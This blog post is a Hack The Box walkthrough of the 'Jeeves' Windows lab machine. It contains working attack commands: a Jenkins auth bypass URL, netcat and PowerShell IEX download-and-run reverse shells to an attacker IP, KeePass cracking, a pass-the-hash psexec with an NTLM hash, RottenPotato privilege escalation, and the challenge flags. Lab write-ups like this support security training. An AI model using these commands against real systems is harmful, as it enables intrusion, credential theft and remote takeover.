---
layout: post
title:  "HTB Jeeves Windows"
tags: HTB, groovy, rottenpotato, john2keepass
---

# Recon
1. Nmap
```ruby
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
```
2. Use Dirbuster find out the directories running on port 50000
3. /askjeeves/ has a Jekins app running
4. to get admin without authenticating:
```ruby
http://10.10.10.63:50000/askjeeves/securityRealm/user/admin/
```

# Exploitation Method 1

1. On Jenkins create a new Item “Execute Windows bash command” and select “Freestyle Project”
2. Select “Add building Step” and select  “Execute Windows bash command” 
3. On the bash console type 
```ruby
powershell wget "http://10.10.14.14/nc.exe" -outfile "nc.exe" 
nc.exe -e cmd.exe 10.10.14.14 9999
```
4. Start apache and place nc.exe for download 
5. Set up nc to listen up
6. Run the shell on jenkins 

Optional and recommended: you can also create a msfvenom shell and multihadler to catch it 

# Privilege Escalation Method 1
1. Download CEH.kdbx keepass file
2. Use john2keepass to create a hashdump file
3. crack the has using john format=KeePass and wordlist=rockyou.txt
4. we obtain the pass : CEH:moonshine1
5. Install Keepass2 : apt-get install keepass2
6. NTLM hash: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
7. Using msf windows smb to connect using the keepass creds   
```ruby
use exploit/windows/smb/psexec
msf exploit(windows/smb/psexec) > set rhost 10.10.10.63
msf exploit(windows/smb/psexec) > set smbuser administrator
msf exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
msf exploit(windows/smb/psexec) > set lport 8888
msf exploit(windows/smb/psexec) > exploit
```
8. There is an alternate data stream applied to the ROOT flag. to view flag
dir /R
more < hm.txt:root.txt

# Exploitation Method 2
1. On Jenkins, create a reverser Groovy shell on the “script console” under “manage Jenkins” tab and run it
2. Set up an nc listener to recieve the shell
3. Spawn a meterpreter shell:
```ruby
use exploit/multi/script/web_delivery
msf exploit(multi/script/web_delivery) > set target 2
msf exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/script/web_delivery) > set lhost 10.10.14.28
msf exploit(multi/script/web_delivery) > set srvhost 10.10.14.28
msf exploit(multi/script/web_delivery) > exploit
```
4. We paste the following generated code into the netcat listener and meterpreter session should be created
```ruby
powershell.exe -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRequest]::GetSystemWebProxy();$B.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $B.downloadstring('http://10.10.14.34:8080/MHGDnJdwHT');
powershell.exe -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRequest]::GetSystemWebProxy();$B.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $B.downloadstring('http://10.10.14.34:8080/MHGDnJdwHT');
```
# Privilege Escalation Method 2

1. Use Windows Exploit Suggesters
2. We use the Vuln MS16-075 and we upload RottenPotato.exe to the target machine
3. then we load meterpretert incognito: load incognito
4. we execute the rottenpotato.exe file
5. then we type:

```ruby
impersonate_token "NT AUTHORITY\SYSTEM"
```
and finally we get root level access.

# Flags
```ruby
| ROOT | afbc5bd4b615a60648cec41c6ac92530 |
| USER | e3232272596fb47950d59c4cf1e7066a |
```



